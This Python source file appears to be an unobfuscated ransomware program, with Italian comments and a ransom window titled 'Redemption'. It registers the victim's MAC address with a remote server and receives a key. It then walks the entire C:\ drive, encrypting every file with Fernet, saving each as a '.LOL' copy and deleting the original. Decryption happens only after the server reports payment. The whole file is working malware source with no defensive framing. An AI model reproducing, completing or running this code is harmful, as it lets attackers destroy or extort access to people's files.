import os
import requests
from uuid import getnode as get_mac
from cryptography.fernet import Fernet
from sys import platform

from window import *
import request

def os_detecting():
    if platform == "linux" or platform == "linux2":
        return "linux"
    elif platform == "darwin":
        return "macos"
    elif platform == "win32" or platform == "cygwin":
        return "windows"


def key_generation(key_path, key):
    print "key_generation: "+key
    write_file(key_path, key)
    f = Fernet(str(key))

    print key

    return f


def key_recuva(key_path, key):
    #key = open_file(key_path)
    f = Fernet(str(key))

    print key

    return f


def crypt(key, data):
    return key.encrypt(data)


def decrypt(key, data):
    return key.decrypt(data)


def open_file(file_name):
    #Read the entire file as a single byte string
    with open(file_name, 'rb') as f:
        data = f.read()

    return data


def write_file(path, file_string):
    with open(path, 'wb') as f:
        f.write(file_string)


def name_and_extension(path):
    name_file = os.path.splitext(os.path.basename(path))[0]
    ext = os.path.splitext(os.path.basename(path))[1]

    return name_file, ext


def still_MAC_Address():
    #transform the integer MAC Address into string with : symbol
    return str ( ':'.join(("%012X" % get_mac() )[i:i + 2] for i in range(0, 12, 2)))


def remove_file(path):
    os.remove(path)


"""Main"""

#MAC Address
mac = still_MAC_Address()
#O.S.
print os_detecting()
"""
if os_detecting() == "linux" or os_detecting() == "macos":
    root_path = "/"
else
    root_path = "C:\"
"""

key_path = ''
key_name = 'kiavetta.key'
root_path = "C:\\"

# se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
# altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
# usala per crittare tutto

if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
    # 1) Request "ifUserPayed(MACAddress)"
    # 2) if True Decrypt everything

    # Create the Request
    req = request.Request({"r": "CheckMAC", "MAC": mac})

    # REQUEST TO SERVER
    resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
    print "CheckMAC"
    print resp
    print "chiave: "+resp["key"]

    #check if payed
    if resp["payed"]:
        # key = db stored key...
        key = key_recuva(key_path+key_name, resp["key"])

        #for every file stored, decrypt everything
        for root, dirs, files in os.walk(root_path):
            for file in files:
                print(os.path.join(root, file))
                tmp_path = os.path.join(root, file)

                if tmp_path.endswith(".LOL"):
                    # Take the name file and the its extension
                    name_file, ext = name_and_extension(tmp_path)

                    # Open file as a string
                    file_string = open_file(tmp_path)

                    #Decrypt
                    file_tmp = decrypt(key, file_string)

                    #Create decrypted file
                    write_file(root+"\\"+name_file, file_tmp)

                    #Remove .LOL file
                    remove_file(tmp_path)

        #Remove kiavetta just for testing
        remove_file(key_path+key_name)

        # Create the Request
        req = request.Request({"r": "DeleteMAC", "MAC": mac})

        # REQUEST TO SERVER
        resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
        print "DeleteMAC"
        print resp


else:
    # 1) Request "CheckMAC(MACAddress)" return Key
    # 2) crypt everything

    # Create the Request
    req = request.Request({"r": "CheckMAC", "MAC": mac})

    # REQUEST TO SERVER
    resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
    print "CheckMAC"
    print resp

    if not os.path.isfile("check.check"):
        # key = db stored key...
        key = key_generation(key_path+key_name, resp["key"])
        print key

        # for every file stored, crypt everything
        for root, dirs, files in os.walk(root_path):
            for file in files:
                print(os.path.join(root, file))
                tmp_path = os.path.join(root, file)

                # Open file as a string
                file_string = open_file(tmp_path)

                # File Encryption
                file_tmp = crypt(key, file_string)

                # Create a file with .LOL extension
                write_file(tmp_path + ".LOL", file_tmp)
                remove_file(tmp_path)

        write_file("check.check", "")

    # Open Window in Windows Desktop
    window = Tk()
    app = Application(window)
    window.winfo_toplevel().title("Redemption")
    window.minsize(width=250, height=180)
    window.mainloop()
